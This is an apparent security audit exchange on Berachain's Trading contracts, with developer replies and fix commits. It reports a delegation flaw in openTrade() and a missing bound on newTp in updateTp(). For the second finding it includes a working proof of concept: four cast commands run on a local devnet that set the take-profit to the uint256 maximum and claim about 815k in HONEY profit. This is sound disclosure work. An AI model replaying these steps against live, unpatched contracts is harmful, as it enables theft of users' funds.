# Trading Contracts

## We managed to get the local environment set up correctly with all the services, so we're all good on that front. We dived deeper into the Trading, TradingStorage, and TradingCallbacks contracts today. Still have quite a bit more code to go through, but we believe to have found two issues so far

### In the `Trading.openTrade()` function, at the end when a limit order is created, it sets `simplifiedTradeId.trader = msg.sender`. This doesn't work correctly in the case where a delegatee is performing this call to `openTrade()` for a delegator. In that case, `msg.sender` would end up being the delegatee's address, whereas the HONEY tokens are originally transferred from the sender address, which is set to `_msgSender()`, which in this case would be set to `senderOverride` == original delegator's address . Our suggestion is to change the line of code to `simplifiedTradeId.trader = sender` instead to prevent delegatee's from being able to open trades using their delegator's tokens

Yeah this one makes a ton of sense, good catch
([fix-commit](https://github.com/berachain/bts/pull/170/commits/d4720a904158e703bc2d87ab272cd2371e7541e6)).

### This one is a potential one as we're unsure of the impact - the `Trading.updateTp()` function does not perform any checks on the newTp argument prior to updating specified order's tp parameter. We noted that this can be used to artificially pass the `t.buy ? a.price >= t.tp : a.price <= t.tp` check in `TradingCallbacks.executeNftCloseOrderCallback()` and get rewards when you shouldn't, but that code seems to be commented out. We'll keep investigating this more on our end, but just wanted to let you know about this in this update

Agreed, there should definitely be sanity check to the `newTp` input. At the very least, the validation check that's run
in `openTrade()` can also be run here:

```solidity
require(newTp == 0 || (t.buy ? newTp > t.openPrice : newTp < t.openPrice), "WRONG_TP");
```

### We also wanted to let you know that the updateTp() issue I mentioned yesterday has no impact since that NFT bot reward code is commented out, and there's no other way to abuse that currently

### [12-01-2023 Follow-up] We found that an attacker can profit with this bug by utilizing the following steps in the local development environment, below

### We had to make a few changes to the configs to get the oracle precompile working, but assuming that works on your end already

### Approve the TradingStorage contract

```sh
cast send --rpc-url $RPC_URL --private-key $BOTPK 0x7eeca4205ff31f947edbd49195a7a88e6a91161b "approve(address,uint256)" 0xdca334ea93855f092c644b3a334ccd94868437a0 115792089237316195423570985008687907853269984665640564039457584007913129639935
```

### Assuming the $BOT address has at least 100000000000000000000000 (i.e 100000e18) HONEY tokens, you can open a trade with `positionSizeDai` set to 100000e18

```sh
cast send 0xE09A7C6c401E10eB88bc2920bC7093885375E28f "openTrade((address,uint256,uint256,uint256,uint256,uint256,bool,uint256,uint256,uint256),uint8,uint256)" '(0x6632a45926F20410F52B49f805d4987BE608829e, 0, 0, 0, 100000000000000000000000, 3810500000000, false, 100, 0, 0)' 0 1000000000000 --private-key $BOTPK --rpc-url=$RPC_URL
```

### Now, utilize the `updateTp()` bug to set the tp to `type(uint256).max)`

```sh
cast send 0xE09A7C6c401E10eB88bc2920bC7093885375E28f "updateTp(uint256,uint256,uint256)" 0 0 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
--private-key $BOTPK --rpc-url=$RPC_URL
```

### Now, execute the NFT order (or wait for the bot to do it)

```sh
cast send 0xE09A7C6c401E10eB88bc2920bC7093885375E28f "executeNftOrder(uint8,address,uint256,uint256)" 0 0x6632a45926F20410F52B49f805d4987BE608829e 0 0 --private
-key $BOTPK --rpc-url=$RPC_URL
```

### Your balance now, assuming you started with 100000e18 HONEY tokens, will be 10815042502956293999999991, which is a profit of 815042502956293999999991 HONEY. If this is pegged to USD, then that's 815k USD. Note that going over 100000e18 for `positionSizeDai` is not possible due to the `ABOVE_MAX_POS` check

### The reason this works is a) due to the `updateTp()` bug, but also b) in `executeNftCloseOrderCallback()`, in the first few lines, `v.price` is set to `t.tp` under certain conditions, which are very easy to meet with `updateTp()`. Later on, `v.reward1` will also be set since `a.price <= t.tp` (we make a sell order and put `t.tp` to the max, and `a.price` will always be below it). Finally, `currentPercentProfit()` is called, which uses `v.price`, which will now be `type(uint256).max`. It ends up returning `maxPnlP`, which is 900% profit. The profit in this case I think takes into account the NFT bot reward too

### Just clarifying that this is to give you the full picture, the only bug here is the missing check in `updateTp()`

I see, thanks for the detailed scenario walkthrough. Weâ€™ve set lower bounds on the `newTp`, would also be prudent to set
upper bounds on the `newTp`, which can easily be done using the existing `correctTp` helper function.

[Fix commit](https://github.com/berachain/bts/pull/175/commits/d2cba63632c47d106dc72079e95b148d7460e672#diff-46cdf3f670b30de773353dfaa061ba9324aa9386ba4d714a636702327f77e7f3)
for checking the upper bound on `newTp`.
